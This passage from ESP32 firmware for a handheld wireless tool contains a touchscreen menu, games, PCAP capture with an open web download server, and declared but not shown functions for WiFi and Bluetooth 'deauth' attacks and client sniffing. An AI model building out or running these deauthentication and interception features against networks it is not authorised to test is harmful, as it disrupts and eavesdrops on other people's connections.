#include "esp_log.h"
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <Wire.h>
#include <TFT_eSPI.h>
#include <TAMC_GT911.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>
#include <algorithm>
#include <Preferences.h>
#include <math.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEBeacon.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_bt_device.h>
#include <esp_gap_ble_api.h>
#include <esp_gattc_api.h>
#include <SD.h>
#include <SPI.h>
#include <FS.h>
#include <time.h>
#include <WebServer.h>
#include <ESPmDNS.h>

enum RadioMode {
  RADIO_MODE_NONE,
  RADIO_MODE_WIFI,
  RADIO_MODE_BT
};
// ============================================================
//  WEB SERVER INSTANCE
// ============================================================
WebServer server(80);
// ============================================================
//  CORS SUPPORT FUNCTIONS
// ============================================================

void addCORSHeaders() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.sendHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  server.sendHeader("Access-Control-Allow-Headers", "Content-Type, Accept");
  server.sendHeader("Access-Control-Max-Age", "86400");
}

void handleOptions() {
  addCORSHeaders();
  server.send(200);
}
// ============================================================
//  BLUETOOTH SCANNER DATA
// ============================================================
#define MAX_BT_DEVICES 20
struct BTDeviceInfo {
  String name;
  String address;
  int rssi;
  bool isRandom;
  uint32_t lastSeen;
  float radarAngle;
  float radarDist;
  unsigned long hitTime;
  bool targeted;
  uint32_t pktCount;
  uint8_t addrType;
};
BTDeviceInfo btDevices[MAX_BT_DEVICES];
int totalBTDevices = 0;
bool btScanning = false;
bool btDeauthRunning = false;
int selectedBTIndex = -1;
int currentBTIndex = 0;
unsigned long btScanStartTime = 0;
BLEScan* pBLEScan = nullptr;
bool scanComplete = false;
unsigned long btAttackStartTime = 0;
uint32_t totalBTPackets = 0;
int btActualRate = 0;
int btPeakRate = 0;
int btPacketsThisSecond = 0;

// ============================================================
//  RADIO MODE SWITCHING SYSTEM (CORRECTED VERSION)
// ============================================================

// ================= MODE SYSTEM =================


RadioMode currentRadioMode = RADIO_MODE_NONE;
RadioMode targetRadioMode = RADIO_MODE_NONE;

unsigned long lastRadioModeSwitch = 0;
#define RADIO_MODE_SWITCH_COOLDOWN 1000

// Radio state flags
bool wifiRadioEnabled = false;
bool btRadioEnabled = false;
bool btRadioInitialized = false;

// ================= REQUEST RADIO SWITCH =================
void requestRadioModeSwitch(RadioMode newMode) {
  if (millis() - lastRadioModeSwitch < RADIO_MODE_SWITCH_COOLDOWN) return;
  if (newMode == currentRadioMode) return;
  targetRadioMode = newMode;
  Serial.printf("[RADIO] Request switch to mode: %d\n", newMode);
}

// ================= STOP ALL RADIOS =================
void stopAllRadios() {
  Serial.println("[RADIO] Stopping all radios");

  // ===== STOP WIFI =====
  if (wifiRadioEnabled) {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect(true, true);
    delay(50);
    esp_wifi_stop();
    delay(50);
    esp_wifi_deinit();
    WiFi.mode(WIFI_OFF);
    wifiRadioEnabled = false;
    Serial.println("[RADIO] WiFi stopped");
  }

  // ===== STOP BLUETOOTH =====
  if (btScanning) {
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
    }
    btScanning = false;
    Serial.println("[RADIO] BLE scan stopped");
  }

  if (btRadioInitialized) {
    esp_bluedroid_disable();
    esp_bluedroid_deinit();
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    btRadioInitialized = false;
    btRadioEnabled = false;
    Serial.println("[RADIO] Bluetooth stopped");
  }

  delay(200);
}

// ================= START WIFI RADIO =================
void startWiFiRadio() {
  Serial.println("[RADIO] Starting WiFi...");
  
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  wifiRadioEnabled = true;
  Serial.println("[RADIO] WiFi started");
}

// ================= START BLUETOOTH RADIO =================
void startBluetoothRadio() {
  Serial.println("[RADIO] Starting Bluetooth...");

  if (!btRadioInitialized) {
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init();
    esp_bluedroid_enable();
    btRadioInitialized = true;
  }

  btRadioEnabled = true;
  Serial.println("[RADIO] Bluetooth started");
}

// ================= SWITCH RADIO MODE =================
void switchRadioMode(RadioMode newMode) {
  Serial.printf("[RADIO] Switching to mode: %d\n", newMode);
  
  stopAllRadios();
  delay(200);

  if (newMode == RADIO_MODE_WIFI) {
    startWiFiRadio();
  } 
  else if (newMode == RADIO_MODE_BT) {
    startBluetoothRadio();
  }

  currentRadioMode = newMode;
  lastRadioModeSwitch = millis();
  Serial.printf("[RADIO] Switched to mode: %d\n", currentRadioMode);
}

// ================= HANDLE RADIO SWITCH =================
void handleRadioModeSwitch() {
  if (targetRadioMode != currentRadioMode && targetRadioMode != RADIO_MODE_NONE) {
    switchRadioMode(targetRadioMode);
  }
}

bool isWiFiRadioAvailable() {
  return (currentRadioMode == RADIO_MODE_WIFI && wifiRadioEnabled);
}

bool isBluetoothRadioAvailable() {
  return (currentRadioMode == RADIO_MODE_BT && btRadioEnabled);
}

// ============================================================
//  HARDWARE OBJECTS
// ============================================================
TFT_eSPI tft = TFT_eSPI();

// ============================================================
//  SD CARD PINS
// ============================================================
#define SD_CS    5
#define SD_SCK   18
#define SD_MOSI  23
#define SD_MISO  19

// ============================================================
//  COLORS
// ============================================================
#define C_BG          0x0000
#define C_GREEN       0x07E0
#define C_GREEN_DIM   0x03E0
#define C_GREEN_DARK  0x01A0
#define C_GREEN_FADE  0x00C0
#define C_CYAN        0x07FF
#define C_RED         0xF800
#define C_ORANGE      0xFD20
#define C_WHITE       0xFFFF
#define C_YELLOW      0xFFE0
#define C_GREY        0x4208
#define C_BLUE        0x001F
#define C_PURPLE      0xF81F
#define C_BLACK       0x0000

// ============================================================
//  TETRIS DEFINES
// ============================================================
#define TETRIS_BOARD_W     10
#define TETRIS_BOARD_H     20
#define TETRIS_BLOCK_SIZE  12
#define TETRIS_OFFSET_X    50
#define TETRIS_OFFSET_Y    40

const uint16_t tetrominos[7][4] = {
  {0x0F00, 0x2222, 0x00F0, 0x2222},
  {0x8E00, 0x6440, 0x0E20, 0x44C0},
  {0xCC00, 0xCC00, 0xCC00, 0xCC00},
  {0x6C00, 0x4620, 0x06C0, 0x8C40},
  {0xC600, 0x2640, 0x0C60, 0x4C80},
  {0x4E00, 0x4640, 0x0E40, 0x4C40},
  {0x2E00, 0x6440, 0x0E80, 0xC440},
};

// ============================================================
//  GALAGA DEFINES
// ============================================================
#define GALAGA_STATE_MENU 0
#define GALAGA_STATE_PLAYING 1
int galagaState = GALAGA_STATE_MENU;

// ============================================================
//  PCAP FILE LIST STRUCTURES
// ============================================================
#define MAX_PCAP_FILES 100
struct PCAPFileInfo {
  String name;
  uint32_t size;
  uint32_t packetCount;
};
PCAPFileInfo pcapFiles[MAX_PCAP_FILES];
int totalPcapFiles = 0;
int currentPcapFileIndex = 0;
int selectedPcapFileIndex = -1;

typedef struct pcap_hdr_s {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} pcap_hdr_t;

typedef struct pcaprec_hdr_s {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} pcaprec_hdr_t;

struct PacketInfo {
  uint32_t timestamp;
  uint32_t length;
  uint8_t destMAC[6];
  uint8_t srcMAC[6];
  uint8_t bssid[6];
  uint8_t frameType;
  uint8_t frameSubtype;
  int8_t rssi;
  String destMACStr;
  String srcMACStr;
  String bssidStr;
  String frameTypeStr;
};

struct PCAPCapture {
  File currentFile;
  String filename;
  uint32_t packetCount;
  uint32_t startTime;
  uint32_t fileSize;
  bool isCapturing;
  uint32_t maxFileSize;
  uint32_t maxPackets;
  uint8_t channel;
  uint32_t captureDuration;
  bool filterByNetwork;
  uint8_t targetBSSID[6];
  String targetSSID;
  int targetChannel;
  bool filterByDevice;
  uint8_t targetDeviceMAC[6];
  String targetDeviceMACStr;
  bool deviceIsClient;
  PacketInfo packetList[50];
  uint8_t packetListIndex;
  bool viewingPackets;
  uint32_t viewedPacketIndex;
} pcap;

// ============================================================
//  PCAP SEPARATE WIFI SCANNING STRUCTURES
// ============================================================
#define PCAP_MAX_NETWORKS 20
struct PCAPNetworkInfo {
  String ssid;
  int32_t rssi;
  int32_t channel;
  uint8_t encryptionType;
  uint8_t bssid[6];
  String bssidStr;
};
PCAPNetworkInfo pcapNetworks[PCAP_MAX_NETWORKS];
int pcapTotalNetworks = 0;
int pcapSelectedNetworkIndex = -1;
int pcapCurrentNetworkIndex = 0;

#define PCAP_MAX_CLIENTS 10
struct PCAPClientInfo {
  uint8_t mac[6];
  String macStr;
  int8_t rssi;
  uint32_t pktCount;
  bool targeted;
  uint32_t lastSeen;
  uint8_t oui[3];
};
PCAPClientInfo pcapClients[PCAP_MAX_CLIENTS];
int pcapTotalClients = 0;
int pcapSelectedClientIndex = -1;
int pcapCurrentClientIndex = 0;
bool pcapSnifferRunning = false;
uint8_t pcapSniffBSSID[6];
String pcapSniffSSID = "";
portMUX_TYPE pcapSnifferMux = portMUX_INITIALIZER_UNLOCKED;

// ============================================================
//  SCREEN LAYOUT
// ============================================================
#define SCREEN_W      480
#define SCREEN_H      320
#define HEADER_H      14

#define LIST_X        0
#define LIST_Y        HEADER_H
#define LIST_W        230
#define LIST_H        256
#define LIST_ROW_H    24
#define LIST_ROWS     10
#define LIST_HEADER_H 22

#define RADAR_PANEL_X 232
#define RADAR_PANEL_Y HEADER_H
#define RADAR_PANEL_W 248
#define RADAR_PANEL_H 256
#define RADAR_CX      (RADAR_PANEL_X + RADAR_PANEL_W/2)
#define RADAR_CY      (RADAR_PANEL_Y + RADAR_PANEL_H/2)
#define RADAR_R       118

#define BTN_Y         272
#define BTN_H          46
#define BTN_GAP         2
#define BTN_W          ((SCREEN_W - BTN_GAP*8 - 4) / 9)

#define HOME_X        2
#define PREV_X        (HOME_X   + BTN_W + BTN_GAP)
#define NEXT_X        (PREV_X   + BTN_W + BTN_GAP)
#define SEL_X         (NEXT_X   + BTN_W + BTN_GAP)
#define DEAUTH_X      (SEL_X    + BTN_W + BTN_GAP)
#define STOP_X        (DEAUTH_X + BTN_W + BTN_GAP)
#define CONN_X        (STOP_X   + BTN_W + BTN_GAP)
#define CLIENT_X      (CONN_X   + BTN_W + BTN_GAP)
#define SCAN_X        (CLIENT_X + BTN_W + BTN_GAP)

// ============================================================
//  TOUCH
// ============================================================
#define TOUCH_SDA  33
#define TOUCH_SCL  32
#define TOUCH_INT  36
#define TOUCH_RST  25
#define TOUCH_DEBOUNCE 300

unsigned long lastTouchTime = 0;
bool          wasTouched    = false;

// ============================================================
//  RADAR STATE
// ============================================================
float         sweepAngle        = 0.0f;
#define       SWEEP_SPEED       3.5f
#define       TRAIL_STEPS       30
float         netRadarAngle[20];
float         netRadarDist[20];
unsigned long netHitTime[20];

// ============================================================
//  APP MODES
// ============================================================
enum AppMode {
  MODE_MAIN_MENU,
  MODE_GAMES_MENU,
  MODE_WIFI_DEAUTH,
  MODE_BT_SCANNER,
  MODE_TETRIS,
  MODE_GALAGA,
  MODE_PCAP_CAPTURE,
  MODE_PCAP_PACKET_VIEW,  
  MODE_PCAP_SCAN_VIEW,   
  MODE_PCAP_CLIENT_VIEW,
  MODE_PCAP_FILE_LIST,
};

AppMode currentMode = MODE_MAIN_MENU;

// ============================================================
//  TETRIS VARIABLES
// ============================================================
byte tetrisBoard[TETRIS_BOARD_H][TETRIS_BOARD_W] = {0};
int tetrisScore = 0;
int tetrisLevel = 0;
int tetrisLines = 0;
int tetrisCurrentPiece = 0;
int tetrisNextPiece = 0;
int tetrisCurrentX = 3;
int tetrisCurrentY = 0;
int tetrisRotation = 0;
unsigned long tetrisLastFall = 0;
int tetrisFallDelay = 500;
bool tetrisGameActive = false;
bool tetrisGameOver = false;

// ============================================================
//  CONFIG
// ============================================================
struct Config { String botToken; String chatId; bool telegramEnabled; } config;
Preferences preferences;

// ============================================================
//  HARDWARE OBJECTS
// ============================================================
TAMC_GT911 ts = TAMC_GT911(TOUCH_SDA, TOUCH_SCL, TOUCH_INT, TOUCH_RST, 480, 320);

struct TouchCalibration {
  int xMin=0, xMax=480, yMin=0, yMax=320;
  bool flipX=true, flipY=true, swapXY=false;
} touchCal;

// ============================================================
//  NETWORK DATA (Main WiFi Scanner)
// ============================================================
#define MAX_NETWORKS 20
struct NetworkInfo {
  String ssid; int32_t rssi; int32_t channel;
  uint8_t encryptionType; uint8_t bssid[6]; String bssidStr; bool targeted;
};
NetworkInfo networks[MAX_NETWORKS];
int totalNetworks=0, currentIndex=0, selectedNetworkIndex=-1;

// ============================================================
//  CLIENT DATA (Main WiFi Scanner)
// ============================================================
#define MAX_CLIENTS 15
struct ClientInfo {
  uint8_t mac[6]; String macStr; int8_t rssi; uint32_t pktCount; bool targeted;
  uint32_t lastSeen;
  uint8_t oui[3];
};
ClientInfo clients[MAX_CLIENTS];
volatile int totalClients = 0;
portMUX_TYPE snifferMux   = portMUX_INITIALIZER_UNLOCKED;

bool clientViewActive    = false;
bool clientDeauthRunning = false;
int  clientViewIndex     = 0;
int  selectedClientIdx   = -1;
bool snifferRunning      = false;
uint8_t sniffBSSID[6];
String  sniffSSID = "";

// ============================================================
//  PACKET ENGINE
// ============================================================
#define PKT_SIZE  28
#define PKT_BURST 128
uint8_t pktAP[PKT_BURST][PKT_SIZE];
uint8_t pktCL[PKT_BURST][PKT_SIZE];
bool    pktsBuilt  = false;
uint8_t broadcastMA[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

bool          deauthRunning      = false;
int           attackChannel      = 1;
unsigned long totalPackets       = 0;
int           actualRate         = 0;
int           peakRate           = 0;
int           packetsThisSecond  = 0;
unsigned long lastRateCheck      = 0;
unsigned long lastDisplayUpdate  = 0;
unsigned long attackStartTime    = 0;
uint16_t      seqNum             = 0;

// ============================================================
//  WIFI STATE
// ============================================================
bool          isConnectedToNetwork = false;
bool          isConnecting         = false;
unsigned long connectionStartTime  = 0;
#define CONNECTION_TIMEOUT 30000

#define MAX_STORED_NETWORKS 5
struct StoredNetwork { String ssid; String password; };
StoredNetwork storedNetworks[MAX_STORED_NETWORKS];
int storedNetworkCount = 0;

// ============================================================
//  SERIAL
// ============================================================
String        serialInput      = "";
bool          awaitingPassword = false;
String        pendingSSID      = "";
unsigned long serialPromptTime = 0;
#define SERIAL_TIMEOUT 30000

// ============================================================
//  TELEGRAM
// ============================================================
#define TELEGRAM_API "api.telegram.org"
long          lastUpdateId = 0;
unsigned long lastTGCheck  = 0;
#define TG_INTERVAL 3000

// ============================================================
//  FORWARD DECLARATIONS
// ============================================================
void silenceLogs();
void drawMainMenu();
void drawGamesMenu();
void drawListPanel();
void drawRadarPanelFrame();
void drawBTRadarPanelFrame();
void drawRadarGrid();
void updateRadarSweep();
void updateBTRadarSweep();
void drawSweepLine(float angleDeg, uint16_t col);
void drawRadarBlip(int idx, float angleDeg, float distNorm, uint16_t col, bool big);
void assignRadarPositions();
void assignBTRadarPositions();
void drawButtons();
void drawClientButtons();
void drawMainMenuButtons();
void drawGamesMenuButtons();
void drawBTButtons();
void drawTetrisButtons();
void drawGalagaButtons();
void drawPCAPButtons();
void drawPCAPScanButtons();
void drawPCAPClientButtons();
void drawPacketViewButtons();
void drawBtn(int x, int y, int w, const char* lbl, uint16_t col);
void drawBtnPressed(int x, int y, int w, const char* lbl);
void drawSignalBars(int x, int y, int rssi);
void displayClientView();
void displayBTScanner();
void displayPCAPView();
void displayPCAPScanView();
void displayPCAPClientView();
void displayPacketView();
void updateAttackOverlay();
void showMessage(String msg, int dur=1200);
void showIsolationMessage(String ssid);
void handleTouch(uint16_t x, uint16_t y);
void handleMainMenuTouch(uint16_t x, uint16_t y);
void handleGamesMenuTouch(uint16_t x, uint16_t y);
void handleClientTouch(uint16_t x, uint16_t y);
void handleBTTouch(uint16_t x, uint16_t y);
void handleTetrisTouch(uint16_t x, uint16_t y);
void handleGalagaTouch(uint16_t x, uint16_t y);
void handlePCAPTouch(uint16_t x, uint16_t y);
void handlePCAPScanTouch(uint16_t x, uint16_t y);
void handlePCAPClientTouch(uint16_t x, uint16_t y);
void handlePacketViewTouch(uint16_t x, uint16_t y);
void scanNetworks();
void prevNetwork();
void nextNetwork();
void selectCurrentNetwork();
void enterClientView();
void exitClientView();
void connectToSelectedNetwork();
void connectToWiFiNetwork(String ssid, String password);
void disconnectFromWiFi();
void addStoredNetwork(String ssid, String password);
void startDeauth();
void startClientDeauth(int idx);
void stopDeauth();
bool buildDeauthPackets(uint8_t* bssid, uint8_t* clientMAC);
void buildDeauthFrame(uint8_t* buf, uint8_t* dst, uint8_t* bssid, uint16_t seq);
void sendBurst();
bool setChannel(int ch);
bool resetWiFiForDeauth();
void restoreWiFi();
bool startSniffer(int channel, uint8_t* bssid, String ssid);
void stopSniffer();
void checkTelegram();
void handleTGCommand(String cmd, String chatId);
bool sendTG(String msg, String chatId);
void sendStatsTG(String chatId);
void handleSerialInput();
void processSerialCommand(String cmd);
void printHelp();
bool loadConfig();
void saveConfig();
void calibrateTouch();
int  mapTX(int rx, int ry);
int  mapTY(int rx, int ry);
uint16_t sigColor(int rssi);
String   encStr(uint8_t e);
String   getManufacturer(uint8_t* oui);
void     cleanupStaleClients();
void displayPCAPFileList();
void scanPCAPFiles();
void deleteSelectedPCAPFile();
void viewPCAPFileStats();
void drawPCAPFileListButtons();
void handlePCAPFileListTouch(uint16_t x, uint16_t y);
bool initSDCard();
String generatePCAPFilename();
bool startPCAPCapture(uint32_t duration = 0, uint32_t maxPackets = 10000);
void stopPCAPCapture();
void IRAM_ATTR pcapSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void writePacketToPCAP(uint8_t* packetData, uint32_t packetLen, uint32_t timestamp);
void listPCAPFiles();
bool deletePCAPFile(String filename);
void viewPCAPStats(String filename);
void selectPCAPNetwork();
void selectPCAPClient();
void selectPCAPAP();
void clearPCAPFilters();
void enterPacketView();
void exitPacketView();
String getFrameTypeString(uint8_t frameControl);
void addPacketToList(wifi_promiscuous_pkt_t* pkt);
void pcapScanNetworks();
void pcapPrevNetwork();
void pcapNextNetwork();
void pcapSelectNetwork();
void pcapStartClientSniffer();
void pcapStopClientSniffer();
void pcapPrevClient();
void pcapNextClient();
void pcapSelectClient();
void IRAM_ATTR pcapClientSnifferCB(void* buf, wifi_promiscuous_pkt_type_t type);
void pcapCleanupStaleClients();
void startBTScan();
void stopBTScan();
void displayBTDevices();
void prevBTDevice();
void nextBTDevice();
void selectBTDevice();
void startBTDeauth();
void stopBTDeauth();
void sendBTDeauthPacket(uint8_t* targetMAC);
void updateBTAttackOverlay();
void initTetris();
void drawTetris();
void drawTetrisBoard();
void drawNextPiece();
void spawnNewPiece();
bool checkCollision(int piece, int rot, int x, int y);
void mergePiece();
void clearLines();
void rotatePiece();
void movePiece(int dx, int dy);
void hardDrop();
void gameOver();
void initGalaga();
void drawGalaga();
void updateGalaga();

// ============================================================
//  WEB SERVER FUNCTIONS FOR PCAP DOWNLOAD
// ============================================================

void handleListPCAPFiles() {
  addCORSHeaders();
  StaticJsonDocument<4096> doc;
  JsonArray files = doc.createNestedArray("files");
  
  File root = SD.open("/pcap");
  if(root) {
    File file = root.openNextFile();
    while(file) {
      if(!file.isDirectory()) {
        String name = file.name();
        if(name.endsWith(".pcap")) {
          JsonObject fileObj = files.createNestedObject();
          fileObj["name"] = name;
          fileObj["size"] = file.size();
          fileObj["modified"] = file.getLastWrite();
        }
      }
      file = root.openNextFile();
    }
    root.close();
  }
  
  String response;
  serializeJson(doc, response);
  server.send(200, "application/json", response);
   server.sendHeader("Access-Control-Allow-Origin", "*");
  server.sendHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  server.sendHeader("Access-Control-Allow-Headers", "Content-Type");
  server.send(200, "application/json", response);
}

void handleDownloadPCAP() {
  addCORSHeaders();
  if(!server.hasArg("file")) {
    server.send(400, "text/plain", "Missing file parameter");
    return;
  }
  
  String filename = server.arg("file");
  filename.replace("..", "");
  filename.replace("/", "");
  
  String fullpath = "/pcap/" + filename;
  
  if(!SD.exists(fullpath)) {
    server.send(404, "text/plain", "File not found");
    return;
  }
  
  File file = SD.open(fullpath, FILE_READ);
  if(!file) {
    server.send(500, "text/plain", "Failed to open file");
    return;
  }
  
  server.sendHeader("Content-Type", "application/vnd.tcpdump.pcap");
  server.sendHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");
  server.sendHeader("Content-Length", String(file.size()));
  
  if(server.streamFile(file, "application/vnd.tcpdump.pcap") != file.size()) {
    Serial.println("File streaming incomplete");
  }
  
  file.close();
}

void handleLatestPCAP() {
  addCORSHeaders();
  File root = SD.open("/pcap");
  if(!root) {
    server.send(404, "text/plain", "No PCAP directory");
    return;
  }
  
  String latestFile = "";
  time_t latestTime = 0;
  
  File file = root.openNextFile();
  while(file) {
    if(!file.isDirectory()) {
      String name = file.name();
      if(name.endsWith(".pcap")) {
        time_t modTime = file.getLastWrite();
        if(modTime > latestTime) {
          latestTime = modTime;
          latestFile = name;
        }
      }
    }
    file = root.openNextFile();
  }
  root.close();
  
  if(latestFile.length() == 0) {
    server.send(404, "text/plain", "No PCAP files found");
    return;
  }
  
  String fullpath = "/pcap/" + latestFile;
  File pcapFile = SD.open(fullpath, FILE_READ);
  if(!pcapFile) {
    server.send(500, "text/plain", "Failed to open file");
    return;
  }
  
  server.sendHeader("Content-Type", "application/vnd.tcpdump.pcap");
  server.sendHeader("Content-Disposition", "attachment; filename=\"" + latestFile + "\"");
  server.sendHeader("Content-Length", String(pcapFile.size()));
  
  server.streamFile(pcapFile, "application/vnd.tcpdump.pcap");
  pcapFile.close();
}

void handleSDInfo() {
   addCORSHeaders();
  StaticJsonDocument<256> doc;
  
  if(SD.begin(SD_CS)) {
    uint64_t total = SD.totalBytes();
    uint64_t used = SD.usedBytes();
    
    doc["status"] = "ok";
    doc["total_bytes"] = total;
    doc["used_bytes"] = used;
    doc["free_bytes"] = total - used;
    doc["total_mb"] = total / (1024 * 1024);
    doc["used_mb"] = used / (1024 * 1024);
    doc["free_mb"] = (total - used) / (1024 * 1024);
    
    File root = SD.open("/pcap");
    int pcapCount = 0;
    if(root) {
      File file = root.openNextFile();
      while(file) {
        if(!file.isDirectory() && String(file.name()).endsWith(".pcap")) {
          pcapCount++;
        }
        file = root.openNextFile();
      }
      root.close();
    }
    doc["pcap_count"] = pcapCount;
  } else {
    doc["status"] = "error";
    doc["message"] = "SD Card not initialized";
  }
  
  String response;
  serializeJson(doc, response);
  server.send(200, "application/json", response);
}

void handleRootPage() {

  addCORSHeaders();

  String html = "<!DOCTYPE html><html><head><title>ESP32 PCAP Server</title>";
  html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<style>body{font-family:sans-serif;background:#0a1a2a;color:#fff;padding:20px;}";
  html += ".card{background:#1e2f3c;border-radius:12px;padding:20px;margin:10px 0;}";
  html += "button{background:#4ecdc4;border:none;padding:10px 20px;border-radius:20px;cursor:pointer;}";
  html += "a{color:#4ecdc4;text-decoration:none;}</style></head><body>";
  html += "<h1>📡 ESP32 PCAP Server</h1>";
  html += "<div class='card'><h2>PCAP Files on SD Card</h2>";
  html += "<ul id='fileList'></ul><button onclick='fetchFiles()'>Refresh</button></div>";
  html += "<div class='card'><h2>Download Latest PCAP</h2>";
  html += "<button onclick='downloadLatest()'>Download Latest</button></div>";
  html += "<script>";
  html += "async function fetchFiles(){";
  html += "let r=await fetch('/list');let d=await r.json();";
  html += "let ul=document.getElementById('fileList');ul.innerHTML='';";
  html += "d.files.forEach(f=>{let li=document.createElement('li');";
  html += "li.innerHTML=`📄 ${f.name} (${(f.size/1024).toFixed(1)} KB) <a href='/download?file=${f.name}'>Download</a>`;";
  html += "ul.appendChild(li);});}";
  html += "function downloadLatest(){window.location.href='/latest';}";
  html += "fetchFiles();</script></body></html>";
  
  server.send(200, "text/html", html);
}

void setupWebServer() {
  // Add OPTIONS handlers for CORS preflight
  server.on("/", HTTP_OPTIONS, handleOptions);
  server.on("/list", HTTP_OPTIONS, handleOptions);
  server.on("/download", HTTP_OPTIONS, handleOptions);
  server.on("/latest", HTTP_OPTIONS, handleOptions);
  server.on("/sdinfo", HTTP_OPTIONS, handleOptions);
  
  // Regular GET handlers
  server.on("/", handleRootPage);
  server.on("/list", handleListPCAPFiles);
  server.on("/download", handleDownloadPCAP);
  server.on("/latest", handleLatestPCAP);
  server.on("/sdinfo", handleSDInfo);
  
  server.begin();
  Serial.println("[WEB] HTTP server started on port 80");
  Serial.print("[WEB] ESP32 IP: ");
  Serial.println(WiFi.localIP());
}


// ============================================================
//  UTILS
// ============================================================
void silenceLogs() { esp_log_level_set("*", ESP_LOG_NONE); }

uint16_t sigColor(int rssi) {
  if (rssi > -50) return C_GREEN;
  if (rssi > -60) return C_GREEN_DIM;
  if (rssi > -70) return C_YELLOW;
  return C_RED;
}

String encStr(uint8_t e) {
  switch(e) {
    case WIFI_AUTH_OPEN:         return "Open";
    case WIFI_AUTH_WEP:          return "WEP";
    case WIFI_AUTH_WPA_PSK:      return "WPA";
    case WIFI_AUTH_WPA2_PSK:     return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:     return "WPA3";
    default:                     return "???";
  }
}

String getManufacturer(uint8_t* oui) {
  uint32_t oui_val = (oui[0] << 16) | (oui[1] << 8) | oui[2];
  
  switch(oui_val) {
    case 0x00037F: return "Intel";
    case 0x00156D: return "Apple";
    case 0x0017F2: return "Huawei";
    case 0x002128: return "Samsung";
    case 0x0024B2: return "LG";
    case 0x0050F2: return "Microsoft";
    case 0x00904C: return "TP-Link";
    case 0x00A0C9: return "D-Link";
    case 0x00E04C: return "Realtek";
    case 0x0C8268: return "Cisco";
    default: return "Unknown";
  }
}

void cleanupStaleClients() {
  unsigned long now = millis();
  portENTER_CRITICAL(&snifferMux);
  int newCount = 0;
  for (int i = 0; i < totalClients; i++) {
    if (now - clients[i].lastSeen < 30000) {
      if (i != newCount) {
        memcpy(&clients[newCount], &clients[i], sizeof(ClientInfo));
      }
      newCount++;
    }
  }
  totalClients = newCount;
  portEXIT_CRITICAL(&snifferMux);
}

int mapTX(int rx, int ry) {
  int x = touchCal.swapXY ? map(ry,touchCal.xMin,touchCal.xMax,0,SCREEN_W)
                           : map(rx,touchCal.xMin,touchCal.xMax,0,SCREEN_W);
  if (touchCal.flipX) x = SCREEN_W - x;
  return constrain(x, 0, SCREEN_W);
}

int mapTY(int rx, int ry) {
  int y = touchCal.swapXY ? map(rx,touchCal.yMin,touchCal.yMax,0,SCREEN_H)
                           : map(ry,touchCal.yMin,touchCal.yMax,0,SCREEN_H);
  if (touchCal.flipY) y = SCREEN_H - y;
  return constrain(y, 0, SCREEN_H);
}

// ============================================================
//  PCAP FILE LIST FUNCTIONS
// ============================================================

void scanPCAPFiles() {
  File root = SD.open("/pcap");
  if(!root) {
    Serial.println("[-] Failed to open /pcap directory");
    totalPcapFiles = 0;
    return;
  }
  
  totalPcapFiles = 0;
  File file = root.openNextFile();
  
  while(file && totalPcapFiles < MAX_PCAP_FILES) {
    if(!file.isDirectory()) {
      String name = file.name();
      if(name.endsWith(".pcap")) {
        pcapFiles[totalPcapFiles].name = name;
        pcapFiles[totalPcapFiles].size = file.size();
        pcapFiles[totalPcapFiles].packetCount = (file.size() - sizeof(pcap_hdr_t)) / (sizeof(pcaprec_hdr_t) + 24);
        totalPcapFiles++;
      }
    }
    file = root.openNextFile();
  }
  root.close();
}

void displayPCAPFileList() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W + RADAR_PANEL_W, LIST_H, C_BG);
  
  tft.setTextColor(C_GREEN, C_BG);
  tft.setTextSize(1);
  tft.setCursor(LIST_X + 6, LIST_Y + 6);
  tft.print("PCAP FILES");
  
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(LIST_X + 190, LIST_Y + 6);
  tft.printf("%d", totalPcapFiles);
  
  tft.drawFastHLine(LIST_X, LIST_Y + LIST_HEADER_H, LIST_W, C_GREEN_DARK);
  
  if(totalPcapFiles == 0) {
    tft.setTextColor(C_GREEN_DARK, C_BG);
    tft.setCursor(LIST_X + 20, LIST_Y + 80);
    tft.print("[ NO PCAP FILES ]");
    tft.setCursor(LIST_X + 20, LIST_Y + 100);
    tft.print("Press CAPTURE to start");
    tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
    return;
  }
  
  int startIdx = currentPcapFileIndex - LIST_ROWS/2;
  if(startIdx < 0) startIdx = 0;
  if(startIdx > totalPcapFiles - LIST_ROWS) startIdx = max(0, totalPcapFiles - LIST_ROWS);
  
  for(int row = 0; row < LIST_ROWS && (startIdx + row) < totalPcapFiles; row++) {
    int idx = startIdx + row;
    int ry = LIST_Y + LIST_HEADER_H + 2 + row * LIST_ROW_H;
    bool isCurrent = (idx == currentPcapFileIndex);
    bool isSelected = (idx == selectedPcapFileIndex);
    
    if(isCurrent) {
      tft.fillRect(LIST_X, ry, LIST_W, LIST_ROW_H-1, C_GREEN_DARK);
    }
    
    tft.setTextColor(isSelected ? C_RED : C_GREEN_DIM, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setTextSize(1);
